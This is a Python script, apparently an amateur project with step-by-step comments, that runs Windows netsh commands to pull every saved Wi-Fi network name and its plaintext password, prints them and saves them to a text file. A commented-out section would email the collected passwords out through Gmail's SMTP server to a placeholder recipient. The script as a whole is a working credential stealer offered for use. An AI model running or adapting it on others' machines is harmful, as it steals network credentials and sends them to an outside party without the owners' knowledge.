
from email.message import EmailMessage
import smtplib
import subprocess #allows to use system commands

import re
 #allows us to use regular expressions
#helps us to search specific text in the specific output

command_output = subprocess.run(["netsh" , "wlan" , "show" , "profiles"], capture_output=True).stdout.decode()
# run this command and store it int command_output variable

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
# now find that perticular line in the output and store it in profile_name variable

wifi_list = list() # created a list

if len(profile_names) != 0: # if profile_name content is not equal to 0 means checking is there any value present int profile name 
    for name in profile_names:
        wifi_profile = dict() # created a dictionary list

        profile_info = subprocess.run(["netsh" , "wlan" , "show" , "profile", name], capture_output=True).stdout.decode()
        # checking the information that perticular ssid

        if re.search("Security key           : Absent", profile_info): # if the information carries security key = absent then continue
            continue
        else:

            wifi_profile["ssid"] = name

            profile_info_pass = subprocess.run(["netsh" , "wlan" , "show" , "profile", name , "key=clear"], capture_output=True).stdout.decode()

            password = re.search("Key Content            : (.*)\r" , profile_info_pass)

            if password == None:
                wifi_profile["Password"] = None
            else:
                wifi_profile["Password"] = password[1]
            
            wifi_list.append(wifi_profile)



for x in range(len(wifi_list)):
    print(wifi_list[x])


with open('wifi.txt' , 'w') as fh:
    for x in wifi_list:
        fh.write(f"SSID : {x['ssid']}\n Password : {x['Password']}\n\n")


# # sending the collected passwords with there corresponding ssid's
# email = EmailMessage() # created an object of email message

# email["from"] = "Email_id_of_sender"

# email["to"] = "reciever email address"

# email["subject"] = "wifi_ssid's_and_Passwords"

# email.set_content(wifi_list)


# with smtplib.SMTP(host="smtp.gmail.com" , port=587) as smtp:
#     smtp.ehlo()
#     #connect securly to the server
#     smtp.starttls()
#     #login using username and password to dummy email. Remember to set email to allow les secure apps if using gmail
#     smtp.login("login_id" , "password")
#     #send mail
#     smtp.send_message(email)

